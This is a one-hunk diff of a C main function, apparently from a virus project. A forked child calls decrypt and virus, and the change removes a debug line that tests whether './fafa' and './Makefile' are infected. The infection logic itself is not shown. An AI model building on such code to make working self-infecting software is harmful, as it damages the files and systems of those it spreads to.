@@ -24,9 +24,10 @@ int main(void)
 	pid = fork();
 	if (pid == 0) //children
 	{
+
 		decrypt(0,2,0,0,0);
 		//write(1,"\n",1);
-		printf("\nis it ? :%d ,%d \n", is_infected("./fafa", &file), is_infected("./Makefile", &file));
+
 		virus();
 		exit (0);
 	}
